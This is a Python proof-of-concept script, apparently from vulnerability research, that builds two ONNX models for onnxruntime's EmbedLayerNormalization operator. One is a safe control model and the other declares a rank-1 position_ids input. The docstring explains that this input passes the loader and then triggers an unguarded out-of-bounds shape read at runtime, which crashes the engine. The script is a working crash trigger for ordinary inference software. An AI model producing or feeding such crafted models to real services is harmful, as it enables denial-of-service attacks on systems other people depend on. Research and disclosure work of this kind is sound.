#!/usr/bin/env python3
"""EmbedOverrun — build the two EmbedLayerNormalization models.

* embedoverrun_control.onnx : position_ids declared rank 2 (safe).
* embedoverrun.onnx         : position_ids declared rank 1 (vulnerable).

Both models are valid ONNX and are ACCEPTED by onnxruntime's loader, because
EmbedLayerNormalization's type-and-shape inference validates `input_ids` (rank 2)
but NOT the optional `position_ids` input. The rank-1 declaration only bites at
runtime, inside CheckInputs (embed_layer_norm_helper.h:31), which reads
`position_ids->Shape()[1]` with no rank guard.
"""
import os

import onnx
from onnx import helper, TensorProto

HERE = os.path.dirname(os.path.abspath(__file__))


def build(path, position_ids_shape):
    inputs = [
        helper.make_tensor_value_info("input_ids", TensorProto.INT32, [4, 8]),
        helper.make_tensor_value_info("segment_ids", TensorProto.INT32, [4, 8]),
        helper.make_tensor_value_info("word_embedding", TensorProto.FLOAT, [100, 16]),
        helper.make_tensor_value_info("position_embedding", TensorProto.FLOAT, [100, 16]),
        helper.make_tensor_value_info("segment_embedding", TensorProto.FLOAT, [2, 16]),
        helper.make_tensor_value_info("gamma", TensorProto.FLOAT, [16]),
        helper.make_tensor_value_info("beta", TensorProto.FLOAT, [16]),
        helper.make_tensor_value_info("mask", TensorProto.INT32, [4, 8]),
        # Optional input 8: the one shape inference forgets to validate.
        helper.make_tensor_value_info("position_ids", TensorProto.INT32, position_ids_shape),
    ]
    outputs = [
        helper.make_tensor_value_info("output", TensorProto.FLOAT, [4, 8, 16]),
        helper.make_tensor_value_info("mask_index", TensorProto.INT32, [4]),
        helper.make_tensor_value_info("embedding_sum", TensorProto.FLOAT, [4, 8, 16]),
    ]
    node = helper.make_node(
        "EmbedLayerNormalization",
        ["input_ids", "segment_ids", "word_embedding", "position_embedding",
         "segment_embedding", "gamma", "beta", "mask", "position_ids"],
        ["output", "mask_index", "embedding_sum"],
        domain="com.microsoft",
    )
    graph = helper.make_graph([node], "embed_layer_norm", inputs, outputs)
    model = helper.make_model(graph, opset_imports=[helper.make_opsetid("com.microsoft", 1)])
    model.ir_version = 7
    onnx.checker.check_model(model)
    onnx.save(model, path)
    print(f"[+] wrote {path} (position_ids shape={position_ids_shape})")


def main():
    build(os.path.join(HERE, "embedoverrun_control.onnx"), [4, 8])  # rank 2 -> safe
    build(os.path.join(HERE, "embedoverrun.onnx"), [4])             # rank 1 -> crash


if __name__ == "__main__":
    main()
